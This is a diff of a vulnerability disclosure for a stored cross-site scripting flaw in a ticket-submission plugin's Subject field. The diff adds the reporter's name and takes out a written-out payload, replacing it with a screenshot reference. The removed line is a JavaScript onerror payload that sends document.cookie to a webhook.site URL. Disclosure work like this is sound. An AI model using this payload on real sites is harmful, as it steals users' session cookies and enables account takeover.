@@ -2,7 +2,7 @@
 
 **CVE ID:** Pending  
 **Discovered:** 2025-08-09  
-**Reporter:** [Your Name or Handle]  
+**Reporter:** Athiwat Tiprasaharn  
 **Status:** Vendor notified, patch pending  
 **Severity:** High  
 **CWE:** [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
@@ -35,8 +35,7 @@ An attacker can exploit this flaw by injecting malicious JavaScript code into th
 1. Access the ticket submission form provided by the plugin.  
    (If the site allows public submissions, no authentication is required. Otherwise, log in as a low-privileged user.)
 
-2. In the **Subject** field of the ticket form, insert the following payload:
-"<img src=x onerror="(new Image).src='https://webhook.site/3bdce340-f98e-4d53-9d40-f93c94df619a?c='+encodeURIComponent(document.cookie)">"
+2. In the **Subject** field of the ticket form, insert the following payload as showned in the image below
 <img width="2309" height="1044" alt="สกรีนช็อต 2025-08-09 222657" src="https://github.com/user-attachments/assets/bc27f241-c842-40a8-a5a2-49fa078f3e82" />
 
 
